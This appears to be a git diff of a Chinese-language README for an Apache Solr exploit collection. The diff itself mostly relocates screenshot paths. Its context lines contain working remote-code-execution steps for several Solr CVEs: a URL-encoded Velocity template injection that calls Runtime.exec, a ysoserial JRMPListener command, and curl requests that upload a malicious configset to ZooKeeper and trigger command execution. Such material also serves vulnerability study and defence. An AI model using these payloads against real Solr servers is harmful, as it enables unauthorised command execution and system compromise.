@@ -1,12 +1,6 @@
 # Apache-Solr-Vulnerability
 Apache Solr Some Exploits  🌟
 
-# Solr
-
-Apache Solr为世界上许多最大的互联网站点提供搜索和导航功能,是一个开源的搜索服务器。具有高度可靠、可伸缩和容错的，提供分布式索引、复制和负载平衡查询、自动故障转移和恢复、集中配置等功能。
-
-### List
-
 [CVE-2019-0193](https://github.com/Imanfeng/Apache-Solr-RCE#cve-2019-0193)
 
 [CVE-2019-0192](https://github.com/Imanfeng/Apache-Solr-RCE#cve-2019-0192)
@@ -31,11 +25,11 @@ Apache Solr < 8.2.0 并且开启了DataImportHandler模块(默认情况下该模
 
 2.判断是否存在collections
 
-![屏幕快照 2019-08-09 下午11.59.34](1.png)
+![1](pic/1.png)
 
 3.判断collections是否可以使用dataimport功能
 
-![sc_20190810000739](2.png)
+![2](pic/2.png)
 
 4.debug模式修改configuration
 
@@ -132,7 +126,7 @@ Apache Solr < 8.2.0 并且开启了DataImportHandler模块(默认情况下该模
 </dataConfig>
 ```
 
-![sc_20190809202234](3.png)
+![3](pic/3.png)
 
 
 
@@ -190,7 +184,7 @@ Apache Solr < 8.2.0 并且开启了DataImportHandler模块(默认情况下该模
 </dataConfig>
 ```
 
-![sc_20190810022942](4.png)
+![4](pic/4.png)
 
 [3] JNDI+LDAP（无需目标的CLASSPATH存在数据库驱动）：
 
@@ -243,7 +237,7 @@ python3 -m http.server 8888
 
 ​	（3）execute with this configuration
 
-![5](5.png)
+![5](pic/5.png)
 
 ### 工具利用
 
@@ -268,13 +262,13 @@ configAPI主要功能是检索或修改配置。 GET负责检索，POST负责执
 http://ip:port/solr/admin/cores?wt=json
 ```
 
-![5](7.png)
+![7](pic/7.png)
 
 ```
 http://ip:port/solr/name[0]/config
 ```
 
-![5](8.png)
+![8](pic/8.png)
 
 2.server通过ysoserial部署RMI server
 
@@ -282,7 +276,7 @@ http://ip:port/solr/name[0]/config
 java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1234 Jdk7u21 "cmd"
 ```
 
-![5](9.png)
+![9](pic/9.png)
 
 注意: 你会看到返回中出现500错误
 
@@ -305,7 +299,7 @@ Apache Solr 5.x到8.2.0版本
 http://ip:port/solr/+core_name+/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end
 ```
 
-![6](6.png)
+![6](pic/6.png)
 
 ### 工具利用
 
@@ -436,7 +430,7 @@ Apache Solr Configset Api上传功能存在未授权漏洞。攻击者可以上�
 
 1.首先构造含有恶意配置的myconfigset.zip
 
-![5](10.png)
+![10](pic/10.png)
 
 2.上传myconfigset.zip进入ZooKeeper
 
@@ -444,7 +438,7 @@ Apache Solr Configset Api上传功能存在未授权漏洞。攻击者可以上�
 curl -X POST --header "Content-Type:application/octet-stream" --data-binary @myconfigset.zip "http://localhost:8983/solr/admin/configs?action=UPLOAD&name=test3myConfigSet"
 ```
 
-![5](11.png)
+![11](pic/11.png)
 
 3.从Zookeeper中选择恶意的solrconfig.xml创建新的Collection
 
@@ -452,7 +446,7 @@ curl -X POST --header "Content-Type:application/octet-stream" --data-binary @myc
 curl -v "http://localhost:8983/solr/admin/collections?action=CREATE&name=newCollection3&numShards=2&replicationFactor=1&wt=xml&collection.configName=test3myConfigSet"
 ```
 
-![5](12.png)
+![12](pic/12.png)
 
 4.EXP命令执行
 
@@ -460,4 +454,4 @@ curl -v "http://localhost:8983/solr/admin/collections?action=CREATE&name=newColl
 curl -v "http://127.0.0.1:8983/solr/newCollection3/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
 ```
 
-![5](13.png)
+![13](pic/13.png)
